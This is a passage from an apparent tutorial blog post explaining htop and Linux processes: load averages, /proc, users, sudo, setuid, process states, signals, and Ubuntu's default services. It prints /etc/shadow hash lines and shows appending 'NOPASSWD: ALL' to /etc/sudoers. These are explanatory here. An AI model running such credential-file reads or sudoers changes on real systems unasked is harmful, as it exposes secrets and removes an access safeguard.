/proc/loadavg) and you'll also notice that the load averages have increased. The load average represents the average system load over a period of time. The load number is calculated by counting the number of running (currently running or waiting to run) and uninterruptible processes (waiting for disk or network activity). So it's simply a number of processes. The load averages are then the average number of those processes during the last 1, 5 and 15 minutes, right? It turns out it's not as simple as that. The load average is the exponentially damped moving average of the load number. From Wikipedia: Mathematically speaking, all three values always average all the system load since the system started up. They all decay exponentially, but they decay at different speed. Hence, the 1-minute load average will add up 63% of the load from last minute, plus 37% of the load since start up excluding the last minute. Therefore, it's not technically accurate that the 1-minute load average only includes the last 60 seconds activity (since it still includes 37% activity from the past), but that includes mostly the last minute. Is that what you expected? Let's return to our random number generation. $ cat /proc/loadavg 1.00 0.69 0.35 2/124 1679 While technically not correct, this is how I simplify load averages to make it easier to reason about them. In this case, the random number generation process is CPU bound, so the load average over the last minute is 1.00 or on average 1 running process. Since there is only one CPU on my system, the CPU utilization is 100% since my CPU can run only one process at a time. If I had two cores, my CPU usage would be 50% since my computer can run two processes at the same time. The load average of a computer with 2 cores that has a 100% CPU utilization would be 2.00. You can see the number of your cores or CPUs in the top left corner of htop or by running nproc. Because the load number also includes processes in uninterruptible states which don't have much effect on CPU utilization, it's not quite correct to infer CPU usage from load averages like I just did. This also explains why you may see high load averages but not much load on the CPU. But there are tools like mpstat that can show the instantaneous CPU utilization. $ sudo apt install sysstat -y $ mpstat 1 Linux 4.4.0-47-generic (hostname) 12/03/2016 _x86_64_ (1 CPU) 10:16:20 PM CPU %usr %nice %sys %iowait %irq %soft %steal %guest %gnice %idle 10:16:21 PM all 0.00 0.00 100.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 10:16:22 PM all 0.00 0.00 100.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 10:16:23 PM all 0.00 0.00 100.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 # ... # kill cat /dev/urandom # ... 10:17:00 PM all 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 100.00 10:17:01 PM all 1.00 0.00 0.00 2.00 0.00 0.00 0.00 0.00 0.00 97.00 10:17:02 PM all 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 100.00 Why do we use load averages then? $ curl -s https://raw.githubusercontent.com/torvalds/linux/v4.8/kernel/sched/loadavg.c | head -n 7 /* * kernel/sched/loadavg.c * * This file contains the magic bits required to compute the global loadavg * figure. Its a silly number but people think its important. We go through * great pains to make it work on big machines and tickless kernels. */ ProcessesIn the top right corner, htop shows the total number of processes and how many of them are running. But it says Tasks not processes. Why? Another name for a process is a task. The Linux kernel internally refers to processes as tasks. htop uses Tasks instead of Processes probably because it's shorter and saves some screen space. You can also see threads in htop. To toggle the visibility of threads, hit Shift+H on your keyboard. If you see Tasks: 23, 10 thr, it means it they are visible. You can also see kernel threads with Shift+K. When they are visible, it'll say Tasks: 23, 40 kthr. Process ID / PIDEvery time a new process is started it is assigned an identification number (ID) which is called process ID or PID for short. If you run a program in the background (&) from bash, you will see the job number in square brackets and the PID. $ sleep 1000 & [1] 12503 If you missed it, you can use the $! variable in bash that will expand to the last backgrounded process ID. $ echo $! 12503 Process ID is very useful. It can be used to see details about the process and to control it. procfs is a pseudo file system that lets userland programs to get information from the kernel by reading files. It is usually mounted at /proc/ and to you it looks like a regular directory that you can browse with ls and cd. All information related to a process is located at /proc/<pid>/. $ ls /proc/12503 attr coredump_filter fdinfo maps ns personality smaps task auxv cpuset gid_map mem numa_maps projid_map stack uid_map cgroup cwd io mountinfo oom_adj root stat wchan clear_refs environ limits mounts oom_score schedstat statm cmdline exe loginuid mountstats oom_score_adj sessionid status comm fd map_files net pagemap setgroups syscall For example, /proc/<pid>/cmdline will give the command that was used to launch the process. $ cat /proc/12503/cmdline sleep1000$ Ugh, that's not right. It turns out that the command is separated by the \\0 byte. $ od -c /proc/12503/cmdline 0000000 s l e e p \\0 1 0 0 0 \\0 0000013 which we can replace with a space or newline $ tr '\\0' '\\n' < /proc/12503/cmdline sleep 1000 $ strings /proc/12503/cmdline sleep 1000 The process directory for a process can contain links! For instance, cwd points to the current working directory and exe is the executed binary. $ ls -l /proc/12503/{cwd,exe} lrwxrwxrwx 1 ubuntu ubuntu 0 Jul 6 10:10 /proc/12503/cwd -> /home/ubuntu lrwxrwxrwx 1 ubuntu ubuntu 0 Jul 6 10:10 /proc/12503/exe -> /bin/sleep So this is how htop, top, ps and other diagnostic utilities get their information about the details of a process: they read it from /proc/<pid>/<file>. Process treeWhen you launch a new process, the process that launched the new process is called the parent process. The new process is now a child process for the parent process. These relationships form a tree structure. If you hit F5 in htop, you can see the process hierarchy. You can also use the f switch with ps $ ps f PID TTY STAT TIME COMMAND 12472 pts/0 Ss 0:00 -bash 12684 pts/0 R+ 0:00 \\_ ps f or pstree $ pstree -a init atd cron sshd -D sshd sshd bash pstree -a ... If you have ever wondered why you often see bash or sshd as parents of some of your processes, here's why. This is what happens when you run, say, date from your bash shell: bash creates a new process that is a copy of itself (using a fork system call) it will then load the program from the executable file /bin/date into memory (using an exec system call) bash as the parent process will wait for its child to exit So the /sbin/init with an ID of 1 was started at boot, which spawned the SSH daemon sshd. When you connect to the computer, sshd will spawn a process for the session which in turn will launch the bash shell. I like to use this tree view in htop when I'm also interested in seeing all threads. Process userEach process is owned by a user. Users are represented with a numeric ID. $ sleep 1000 & [1] 2045 $ grep Uid /proc/2045/status Uid: 1000 1000 1000 1000 You can use the id command to find out the name for this user. $ id 1000 uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm) It turns out that id gets this information from the /etc/passwd and /etc/group files. $ strace -e open id 1000 ... open(\"/etc/nsswitch.conf\", O_RDONLY|O_CLOEXEC) = 3 open(\"/lib/x86_64-linux-gnu/libnss_compat.so.2\", O_RDONLY|O_CLOEXEC) = 3 open(\"/lib/x86_64-linux-gnu/libnss_files.so.2\", O_RDONLY|O_CLOEXEC) = 3 open(\"/etc/passwd\", O_RDONLY|O_CLOEXEC) = 3 open(\"/etc/group\", O_RDONLY|O_CLOEXEC) = 3 ... That's because the Name Service Switch (NSS) configuration file /etc/nsswitch.conf says to use these files to resolve names. $ head -n 9 /etc/nsswitch.conf # ... passwd: compat group: compat shadow: compat The value of compat (Compatibility mode) is the same as files except other special entries are permitted. files means that the database is stored in a file (loaded by libnss_files.so). But you could also store your users in other databases and services or use Lightweight Directory Access Protocol (LDAP), for example. /etc/passwd and /etc/group are plain text files that map numeric IDs to human readable names. $ cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash $ cat /etc/group root:x:0: adm:x:4:syslog,ubuntu ubuntu:x:1000: passwd? But where are the passwords? They are actually in /etc/shadow. $ sudo cat /etc/shadow root:$6$mS9o0QBw$P1ojPSTexV2PQ.Z./rqzYex.k7TJE2nVeIVL0dql/:17126:0:99999:7::: daemon:*:17109:0:99999:7::: ubuntu:$6$GIfdqlb/$ms9ZoxfrUq455K6UbmHyOfz7DVf7TWaveyHcp.:17126:0:99999:7::: What's that gibberish? $6$ is the password hashing algorithm used, in this case it stands for sha512 followed by randomly generated salt to safeguard against rainbow table attacks and finally the hash of your password + salt When you run a program, it will be run as your user. Even if the executable file is not owned by you. If you'd like to run a program as root or another user, that's what sudo is for. $ id uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm) $ sudo id uid=0(root) gid=0(root) groups=0(root) $ sudo -u ubuntu id uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm) $ sudo -u daemon id uid=1(daemon) gid=1(daemon) groups=1(daemon) But what if you want to log in as another user to launch various commands? Use sudo bash or sudo -u user bash. You'll be able to use the shell as that user. If you don't like being asked for the root password all the time, you can simply disable it by adding your user to the /etc/sudoers file. Let's try it: $ echo \"$USER ALL=(ALL) NOPASSWD: ALL\" >> /etc/sudoers -bash: /etc/sudoers: Permission denied Right, only root can do it. $ sudo echo \"$USER ALL=(ALL) NOPASSWD: ALL\" >> /etc/sudoers -bash: /etc/sudoers: Permission denied WTF? What happens here is that you are executing the echo command as root but appending the line to the /etc/sudoers file still as your user. There are usually two ways around it: echo \"$USER ALL=(ALL) NOPASSWD: ALL\" | sudo tee -a /etc/sudoers sudo bash -c \"echo '$USER ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers\" In the first case, tee -a will append its standard input to the file and we execute this command as root. In the second case, we run bash as root and ask it to execute a command (-c) and the entire command will be executed as root. Note the tricky \"/' business here which will dictate when the $USER variable will be expanded. If you take a look at the /etc/sudoers file you will see that it begins with $ sudo head -n 3 /etc/sudoers # # This file MUST be edited with the 'visudo' command as root. # Uh oh. It's a helpful warning that says you should edit this file with sudo visudo. It will validate the contents of the file before saving and prevent you from making mistakes. If you don't use visudo and make a mistake, it may lock you out from sudo. Which means that you won't be able to correct your mistake! Let's say you want to change your password. You can do it with the passwd command. It will, as we saw earlier, save the password to the /etc/shadow file. This file is sensitive and only writeable by root: $ ls -l /etc/shadow -rw-r----- 1 root shadow 1122 Nov 27 18:52 /etc/shadow So how is it possible that the passwd program which is executed by a regular user can write to a protected file? I said earlier that when you launch a process, it is owned by you, even if the owner of the executable file is another user. It turns out that you can change that behavior by changing file permissions. Let's take a look. $ ls -l /usr/bin/passwd -rwsr-xr-x 1 root root 54256 Mar 29 2016 /usr/bin/passwd Notice the s letter. It was accomplished with sudo chmod u+s /usr/bin/passwd. It means that an executable will be launched as the the owner of the file which is root in this case. You can find the so called setuid executables with find /bin -user root -perm -u+s. Note that you can also do the same with group (g+s). Process stateWe are next going to look at the process state column in htop which is denoted simply with the letter S. Here are the possible values: R running or runnable (on run queue) S interruptible sleep (waiting for an event to complete) D uninterruptible sleep (usually IO) Z defunct (\"zombie\") process, terminated but not reaped by its parent T stopped by job control signal t stopped by debugger during the tracing X dead (should never be seen) I've ordered them by how often I see them. Note that when you run ps, it will also show substates like Ss, R+, Ss+, etc. $ ps x PID TTY STAT TIME COMMAND 1688 ? Ss 0:00 /lib/systemd/systemd --user 1689 ? S 0:00 (sd-pam) 1724 ? S 0:01 sshd: [emailprotected]pts/0 1725 pts/0 Ss 0:00 -bash 2628 pts/0 R+ 0:00 ps x R - running or runnable (on run queue)In this state, the process is currently running or on a run queue waiting to run. What does it mean to run? When you compile the source code of a program that you've written, that machine code is CPU instructions. It is saved to a file that can be executed. When you launch a program, it is loaded into memory and then the CPU executes these instructions. Basically it means that the CPU is physically executing instructions. Or, in other words, crunching numbers. S - interruptible sleep (waiting for an event to complete)This means that the code instructions of this process are not being executed on the CPU. Instead, this process is waiting for something - an event or a condition - to happen. When an event happens, the kernel sets the state to running. One example is the sleep utily from coreutils. It will sleep for a specific number of seconds (approximately). $ sleep 1000 & [1] 10089 $ ps f PID TTY STAT TIME COMMAND 3514 pts/1 Ss 0:00 -bash 10089 pts/1 S 0:00 \\_ sleep 1000 10094 pts/1 R+ 0:00 \\_ ps f So this is interruptible sleep. How can we interrupt it? By sending a signal. You can send a signal in htop by hitting F9 and then choosing one of the signals in the menu on the left. Sending a signal is also known as kill. That's because kill is a system call that can send a signal to a process. There is a program /bin/kill that can make this system call from userland and the default signal to use is TERM which will ask the process to terminate or in other words try to kill it. Signal is just a number. Numbers are hard to remember so we give them names. Signal names are usually written in uppercase and may be prefixed with SIG. Some commonly used signals are INT, KILL, STOP, CONT, HUP. Let's interrupt the sleep process by sending the INT aka SIGINT aka 2 aka Terminal interrupt signal. $ kill -INT 10089 [1]+ Interrupt sleep 1000 This is also what happens When you hit CTRL+C on your keyboard. bash will the send the foreground process the SIGINT signal just like we just did manually. By the way, in bash, kill is a built-in command, even though there is /bin/kill on most systems. Why? It allows processes to be killed if the limit on processes that you can create is reached. These commands do the same thing: kill -INT 10089 kill -2 10089 /bin/kill -2 10089 Another useful signal to know is SIGKILL aka 9. You may have used it to kill a process that didn't respond to your frantic CTRL+C keyboard presses. When you write a program, you can set up signal handlers that are functions that will be called when your process receives a signal. In other words, you can catch the signal and then do something, for example, clean up and shut down gracefully. So sending SIGINT (the user wants to interrupt a process) and SIGTERM (the user wants to terminate the process) does not mean that the process will be terminated. You may have seen this exception when running Python scripts: $ python -c 'import sys; sys.stdin.read()' ^C Traceback (most recent call last): File \"<string>\", line 1, in <module> KeyboardInterrupt You can tell the kernel to forcefully terminate a process and not give it a change to respond by sending the KILL signal: $ sleep 1000 & [1] 2658 $ kill -9 2658 [1]+ Killed sleep 1000 D - uninterruptible sleep (usually IO)Unlike interruptible sleep, you cannot wake up this process with a signal. That is why many people dread seeing this state. You can't kill such processes because killing means sending SIGKILL signals to processes. This state is used if the process must wait without interruption or when the event is expected to occur quickly. Like reading to/from a disk. But that should only happen for a fraction of a second. Here is a nice answer on StackOverflow. Uninterruptable processes are USUALLY waiting for I/O following a page fault. The process/task cannot be interrupted in this state, because it can't handle any signals; if it did, another page fault would happen and it would be back where it was. In other words, this could happen if you are using Network File System (NFS) and it takes a while to read and write from it. Or in my experience it can also mean that some of the processes are swapping a lot which means you have too little available memory. Let's try to get a process to go into uninterruptible sleep. 8.8.8.8 is a public DNS server provided by Google. They do not have an open NFS on there. But that won't stop us. $ sudo mount 8.8.8.8:/tmp /tmp & [1] 12646 $ sudo ps x | grep mount.nfs 12648 pts/1 D 0:00 /sbin/mount.nfs 8.8.8.8:/tmp /tmp -o rw How to find out what's causing this? strace! Let's strace the command in the output of ps above. $ sudo strace /sbin/mount.nfs 8.8.8.8:/tmp /tmp -o rw ... mount(\"8.8.8.8:/tmp\", \"/tmp\", \"nfs\", 0, ... So the mount system call is blocking the process. If you're wondering, you can run mount with an intr option to run as interruptible: sudo mount 8.8.8.8:/tmp /tmp -o intr. Z - defunct (\"zombie\") process, terminated but not reaped by its parentWhen a process ends via exit and it still has child processes, the child processes become zombie processes. If zombie processes exist for a short time, it is perfectly normal Zombie processes that exist for a long time may indicate a bug in a program Zombie processes don't consume memory, just a process ID You can't kill a zombie process You can ask nicely the parent process to reap the zombies (the SIGCHLD signal) You can kill the zombie's parent process to get rid of the parent and its zombies I am going to write some C code to show this. Here is our program. #include <stdio.h> #include <stdlib.h> #include <unistd.h> int main() { printf(\"Running\\n\"); int pid = fork(); if (pid == 0) { printf(\"I am the child process\\n\"); printf(\"The child process is exiting now\\n\"); exit(0); } else { printf(\"I am the parent process\\n\"); printf(\"The parent process is sleeping now\\n\"); sleep(20); printf(\"The parent process is finished\\n\"); } return 0; } Let's install the GNU C Compiler (GCC). sudo apt install -y gcc Compile it and then run it gcc zombie.c -o zombie ./zombie Look at the process tree $ ps f PID TTY STAT TIME COMMAND 3514 pts/1 Ss 0:00 -bash 7911 pts/1 S+ 0:00 \\_ ./zombie 7912 pts/1 Z+ 0:00 \\_ [zombie] <defunct> 1317 pts/0 Ss 0:00 -bash 7913 pts/0 R+ 0:00 \\_ ps f We got our zombie! When the parent process is done, the zombie is gone. $ ps f PID TTY STAT TIME COMMAND 3514 pts/1 Ss+ 0:00 -bash 1317 pts/0 Ss 0:00 -bash 7914 pts/0 R+ 0:00 \\_ ps f If you replaced sleep(20) with while (true) ; then the zombie would be gone right away. With exit, all of the memory and resources associated with it are deallocated so they can be used by other processes. Why keep the zombie processes around then? The parent process has the option to find out its child process exit code (in a signal handler) with the wait system call. If a process is sleeping, then it needs to wait for it to wake up. Why not simply forcefully wake it up and kill it? For the same reason, you don't toss your child in the trash when you're tired of it. Bad things could happen. T - stopped by job control signalI have opened two terminal windows and I can look at my user's processes with ps u. $ ps u USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND ubuntu 1317 0.0 0.9 21420 4992 pts/0 Ss+ Jun07 0:00 -bash ubuntu 3514 1.5 1.0 21420 5196 pts/1 Ss 07:28 0:00 -bash ubuntu 3528 0.0 0.6 36084 3316 pts/1 R+ 07:28 0:00 ps u I will omit the -bash and ps u processes from the output below. Now run cat /dev/urandom > /dev/null in one terminal window. Its state is R+ which means that it is running. $ ps u USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND ubuntu 3540 103 0.1 6168 688 pts/1 R+ 07:29 0:04 cat /dev/urandom Press CTRL+Z to stop the process. $ # CTRL+Z [1]+ Stopped cat /dev/urandom > /dev/null $ ps aux USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND ubuntu 3540 86.8 0.1 6168 688 pts/1 T 07:29 0:15 cat /dev/urandom Its state is now T. Run fg in the first terminal to resume it. Another way to stop a process like this is to send the STOP signal with kill to the process. To resume the execution of the process, you can use the CONT signal. t - stopped by debugger during the tracingFirst, install the GNU Debugger (gdb) sudo apt install -y gdb Run a program that will listen for incoming network connections on port 1234. $ nc -l 1234 & [1] 3905 It is sleeping meaning it is waiting for data from the network. $ ps u USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND ubuntu 3905 0.0 0.1 9184 896 pts/0 S 07:41 0:00 nc -l 1234 Run the debugger and attach it to the process with ID 3905. sudo gdb -p 3905 You will see that the state is t which means that this process is being traced in the debugger. $ ps u USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND ubuntu 3905 0.0 0.1 9184 896 pts/0 t 07:41 0:00 nc -l 1234 Process timeLinux is a multitasking operating system which means that even when you have a single CPU, you can run several processes at the same time. You can connect to your server via SSH and look at the output of htop while your web server is delivering the content of your blog to your readers over the internet. How is that possible when a single CPU can only execute one instruction at a time? The answer is time sharing. One process runs for a bit of time, then it is suspended while the other processes waiting to run take turns running for a while. The bit of time a process runs is called the time slice. The time slice is usually a few milliseconds so you don't really notice it that much when your system is not under high load. (It'd be really interesting to find out how long time slices usually are in Linux.) This should help explain why the load average is the average number of running processes. If you have just one core and the load average is 1.0, the CPU has been utilized at 100%. If the load average is higher than 1.0, it means that the number of processes wanting to run is higher than the CPU can run so you may experience slow downs or delays. If the load is lower than 1.0, it means the CPU is sometimes idleing and not doing anything. This should also give you a clue why sometimes the running time of a process that's been running for 10 seconds is higher or lower than exactly 10 seconds. Process niceness and priorityWhen you have more tasks to run than the number of available CPU cores, you somehow have to decide which tasks to run next and which ones to keep waiting. This is what the task scheduler is responsible for. The scheduler in the Linux kernel is reponsible for choosing which process on a run queue to pick next and it depends on the scheduler algorithm used in the kernel. You can't generally influence the scheduler but you can let it know which processes are more important to you and the scheduler may take it into account. Niceness (NI) is user-space priority to processes, ranging from -20 which is the highest priority to 19 which is the lowest priority. It can be confusing but you can think that a nice process yields to a less nice process. So the nicer a process is, the more it yields. From what I've pieced together by reading StackOverflow and other sites, a niceness level increase by 1 should yield a 10% more CPU time to the process. The priority (PRI) is the kernel-space priority that the Linux kernel is using. Priorities range from 0 to 139 and the range from 0 to 99 is real time and 100 to 139 for users. You can change the nicesness and the kernel takes it into account but you cannot change the priority. The relation between the nice value and priority is: PR = 20 + NI so the value of PR = 20 + (-20 to +19) is 0 to 39 that maps 100 to 139. You can set the niceness of a process before launching it. nice -n niceness program Change the nicencess when a program is already running with renice. renice -n niceness -p PID Here is what the CPU usage colors mean: Blue: Low priority threads (nice > 0) Green: Normal priority threads Red: Kernel threads http://askubuntu.com/questions/656771/process-niceness-vs-priority Memory usage - VIRT/RES/SHR/MEMA process has the illusion of being the only one in memory. This is accomplished by using virtual memory. A process does not have direct access to the physical memory. Instead, it has its own virtual address space and the kernel translates the virtual memory addresses to physical memory or can map some of it to disk. This is why it can look like processes use more memory than you have installed on your computer. The point I want to make here is that it is not very straightforward to figure out how much memory a process takes up. Do you also want to count the shared libraries or disk mapped memory? But the kernel provides and htop shows some information that can help you estimate memory usage. Here is what the memory usage colors mean: Green: Used memory Blue: Buffers Orange: Cache VIRT/VSZ - Virtual Image The total amount of virtual memory used by the task. It includes all code, data and shared libraries plus pages that have been swapped out and pages that have been mapped but not used. VIRT is virtual memory usage. It includes everything, including memory mapped files. If an application requests 1 GB of memory but uses only 1 MB, then VIRT will report 1 GB. If it mmaps a 1 GB file and never uses it, VIRT will also report 1 GB. Most of the time, this is not a useful number. The non-swapped physical memory a task has used. RES is resident memory usage i.e. what's currently in the physical memory. While RES can be a better indicator of how much memory a process is using than VIRT, keep in mind that this does not include the swapped out memory some of the memory may be shared with other processes If a process uses 1 GB of memory and it calls fork(), the result of forking will be two processes whose RES is both 1 GB but only 1 GB will actually be used since Linux uses copy-on-write. SHR - Shared Mem size The amount of shared memory used by a task. It simply reflects memory that could be potentially shared with other processes. #include <stdio.h> #include <stdlib.h> #include <unistd.h> int main() { printf(\"Started\\n\"); sleep(10); size_t memory = 10 * 1024 * 1024; // 10 MB char* buffer = malloc(memory); printf(\"Allocated 10M\\n\"); sleep(10); for (size_t i = 0; i < memory/2; i++) buffer[i] = 42; printf(\"Used 5M\\n\"); sleep(10); int pid = fork(); printf(\"Forked\\n\"); sleep(10); if (pid != 0) { for (size_t i = memory/2; i < memory/2 + memory/5; i++) buffer[i] = 42; printf(\"Child used extra 2M\\n\"); } sleep(10); return 0; } fallocate -l 10G gcc -std=c99 mem.c -o mem ./mem Process Message VIRT RES SHR main Started 4200 680 604 main Allocated 10M 14444 680 604 main Used 5M 14444 6168 1116 main Forked 14444 6168 1116 child Forked 14444 5216 0 main Child used extra 2M 8252 1116 child Child used extra 2M 5216 0 TODO: I should finish this. MEM% - Memory usage A task's currently used share of available physical memory. This is RES divided by the total RAM you have. If RES is 400M and you have 8 gigabytes of RAM, MEM% will be 400/8192*100 = 4.88%. ProcessesLet's take a look at the process list in the htop screenshot. Do you actually need them? Here are my research notes on the processes that are run at startup on a fresh Digital Ocean droplet with Ubuntu Server 16.04.1 LTS x64. Before /sbin/init The /sbin/init program (also called init) coordinates the rest of the boot process and configures the environment for the user. When the init command starts, it becomes the parent or grandparent of all of the processes that start up automatically on the system. Is it systemd? $ dpkg -S /sbin/init systemd-sysv: /sbin/init Yes, it is. What happens if you kill it? Nothing. https://wiki.ubuntu.com/SystemdForUpstartUsers https://www.centos.org/docs/5/html/5.1/Installation_Guide/s2-boot-init-shutdown-init.html /lib/systemd/systemd-journald systemd-journald is a system service that collects and stores logging data. It creates and maintains structured, indexed journals based on logging information that is received from a variety of sources. In other words: One of the main changes in journald was to replace simple plain text log files with a special file format optimized for log messages. This file format allows system administrators to access relevant messages more efficiently. It also brings some of the power of database-driven centralized logging implementations to individual systems. You are supposed to use the journalctl command to query log files. journalctl _COMM=sshd logs by sshd journalctl _COMM=sshd -o json-pretty logs by sshd in JSON journalctl --since \"2015-01-10\" --until \"2015-01-11 03:00\" journalctl --since 09:00 --until \"1 hour ago\" journalctl --since yesterday journalctl -b logs since boot journalctl -f to follow logs journalctl --disk-usage journalctl --vacuum-size=1G Pretty cool. It looks like it is not possible to remove or disable this service, you can only turn off logging. https://www.freedesktop.org/software/systemd/man/systemd-journald.service.html https://www.digitalocean.com/community/tutorials/how-to-use-journalctl-to-view-and-manipulate-systemd-logs https://www.loggly.com/blog/why-journald/ https://ask.fedoraproject.org/en/question/63985/how-to-correctly-disable-journald/ /sbin/lvmetad -f The lvmetad daemon caches LVM metadata, so that LVM commands can read metadata without scanning disks. Metadata caching can be an advantage because scanning disks is time consuming and may interfere with the normal work of the system and disks. But what is LVM (Logical Volume Management)? You can think of LVM as \"dynamic partitions\", meaning that you can create/resize/delete LVM \"partitions\" (they're called \"Logical Volumes\" in LVM-speak) from the command line while your Linux system is running: no need to reboot the system to make the kernel aware of the newly-created or resized partitions. It sounds like you should keep it if you are using LVM. $ lvscan $ sudo apt remove lvm2 -y --purge http://manpages.ubuntu.com/manpages/xenial/man8/lvmetad.8.html http://askubuntu.com/questions/3596/what-is-lvm-and-what-is-it-used-for /lib/systemd/udevd systemd-udevd listens to kernel uevents. For every event, systemd-udevd executes matching instructions specified in udev rules. udev is a device manager for the Linux kernel. As the successor of devfsd and hotplug, udev primarily manages device nodes in the /dev directory. So this service manages /dev. I am not sure if I need it running on a virtual server. https://www.freedesktop.org/software/systemd/man/systemd-udevd.service.html https://wiki.archlinux.org/index.php/udev /lib/systemd/timesyncd systemd-timesyncd is a system service that may be used to synchronize the local system clock with a remote Network Time Protocol server. So this replaces ntpd. $ timedatectl status Local time: Fri 2016-08-26 11:38:21 UTC Universal time: Fri 2016-08-26 11:38:21 UTC RTC time: Fri 2016-08-26 11:38:20 Time zone: Etc/UTC (UTC, +0000) Network time on: yes NTP synchronized: yes RTC in local TZ: no If we take a look at the open ports on this server: $ sudo netstat -nlput Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 2178/sshd tcp6 0 0 :::22 :::* LISTEN 2178/sshd Lovely! Previously on Ubuntu 14.04 it was $ sudo apt-get install ntp -y $ sudo netstat -nlput Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1380/sshd tcp6 0 0 :::22 :::* LISTEN 1380/sshd udp 0 0 10.19.0.6:123 0.0.0.0:* 2377/ntpd udp 0 0 139.59.256.256:123 0.0.0.0:* 2377/ntpd udp 0 0 127.0.0.1:123 0.0.0.0:* 2377/ntpd udp 0 0 0.0.0.0:123 0.0.0.0:* 2377/ntpd udp6 0 0 fe80::601:6aff:fxxx:123 :::* 2377/ntpd udp6 0 0 ::1:123 :::* 2377/ntpd udp6 0 0 :::123 :::* 2377/ntpd Ugh. https://www.freedesktop.org/software/systemd/man/systemd-timesyncd.service.html https://wiki.archlinux.org/index.php/systemd-timesyncd /usr/sbin/atd -f atd - run jobs queued for later execution. atd runs jobs queued by at. at and batch read commands from standard input or a specified file which are to be executed at a later time Unlike cron, which schedules jobs that are repeated periodically, at runs a job at a specific time once. $ echo \"touch /tmp/yolo.txt\" | at now + 1 minute job 1 at Fri Aug 26 10:44:00 2016 $ atq 1 Fri Aug 26 10:44:00 2016 a root $ sleep 60 && ls /tmp/yolo.txt /tmp/yolo.txt I've actually never used it until now. sudo apt remove at -y --purge http://manpages.ubuntu.com/manpages/xenial/man8/atd.8.html http://manpages.ubuntu.com/manpages/xenial/man1/at.1.html http://askubuntu.com/questions/162439/why-does-ubuntu-server-run-both-cron-and-atd /usr/lib/snapd/snapd Snappy Ubuntu Core is a new rendition of Ubuntu with transactional updates - a minimal server image with the same libraries as todays Ubuntu, but applications are provided through a simpler mechanism. What? Developers from multiple Linux distributions and companies today announced collaboration on the snap universal Linux package format, enabling a single binary package to work perfectly and securely on any Linux desktop, server, cloud or device. Apparently it is a simplified deb package and you're supposted to bundle all dependencies in a single snap that you can distribute. I've never used snappy to deploy or distribute applications on servers. sudo apt remove snapd -y --purge https://developer.ubuntu.com/en/snappy/ https://insights.ubuntu.com/2016/06/14/universal-snap-packages-launch-on-multiple-linux-distros/ /usr/bin/dbus-daemon In computing, D-Bus or DBus is an inter-process communication (IPC) and remote procedure call (RPC) mechanism that allows communication between multiple computer programs (that is, processes) concurrently running on the same machine My understanding is that you need it for desktop environments but on a server to run web apps? sudo apt remove dbus -y --purge I wonder what time it is and whether it is being synchronized with NTP? $ timedatectl status Failed to create bus connection: No such file or directory Oops. Should probably keep this. https://en.wikipedia.org/wiki/D-Bus /lib/systemd/systemd-logind systemd-logind is a system service that manages user logins. https://www.freedesktop.org/software/systemd/man/systemd-logind.service.html /usr/sbin/cron -f cron - daemon to execute scheduled commands (Vixie Cron) -f Stay in foreground mode, don't daemonize. You can schedule tasks to run periodically with cron. Use crontab -e to edit the configuration for your user or on Ubuntu I tend to use the /etc/cron.hourly, /etc/cron.daily, etc. directories. You can see the log files with grep cron /var/log/syslog or journalctl _COMM=cron or even journalctl _COMM=cron --since=\"date\" --until=\"date\" You'll probably want to keep cron. But if you don't, then you should stop and disable the service: sudo systemctl stop cron sudo systemctl disable cron Because otherwise when trying to remove it with apt remove cron it will try to install postfix! $ sudo apt remove cron The following packages will be REMOVED: cron The following NEW packages will be installed: anacron bcron bcron-run fgetty libbg1 libbg1-doc postfix runit ssl-cert ucspi-unix It looks like cron needs a mail transport agent (MTA) to send emails. $ apt show cron Package: cron Version: 3.0pl1-128ubuntu2 ... Suggests: anacron (>= 2.0-1), logrotate, checksecurity, exim4 | postfix | mail-transport-agent $ apt depends cron cron ... Suggests: anacron (>= 2.0-1) Suggests: logrotate Suggests: checksecurity |Suggests: exim4 |Suggests: postfix Suggests: <mail-transport-agent> ... exim4-daemon-heavy postfix https://help.ubuntu.com/community/CronHowto https://www.digitalocean.com/community/tutorials/how-to-use-cron-to-automate-tasks-on-a-vps http://unix.stackexchange.com/questions/212355/where-is-my-logfile-of-crontab /usr/sbin/rsyslogd -n Rsyslogd is a system utility providing support for message logging. In another words, it's what populates log files in /var/log/ like /var/log/auth.log for authentication messages like SSH login attempts. The configuration files are in /etc/rsyslog.d. You can also configure rsyslogd to send log files to a remote server and implement centralized logging. You can use the logger command to log messages to /var/log/syslog in background scripts such as those that are run at boot. #!/bin/bash logger Starting doing something # NFS, get IPs, etc. logger Done doing something Right, but we already have systemd-journald running. Do we need rsyslogd as well? Rsyslog and Journal, the two logging applications present on your system, have several distinctive features that make them suitable for specific use cases. In many situations it is useful to combine their capabilities, for example to create structured messages and store them in a file database. A communication interface needed for this cooperation is provided by input and output modules on the side of Rsyslog and by the Journal's communication socket. So, maybe? I am going to keep it just in case. http://manpages.ubuntu.com/manpages/xenial/man8/rsyslogd.8.html http://manpages.ubuntu.com/manpages/xenial/man1/logger.1.html https://wiki.archlinux.org/index.php/rsyslog https://www.digitalocean.com/community/tutorials/how-to-centralize-logs-with-rsyslog-logstash-and-elasticsearch-on-ubuntu-14-04 https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/7/html/System_Administrators_Guide/s1-interaction_of_rsyslog_and_journal.html 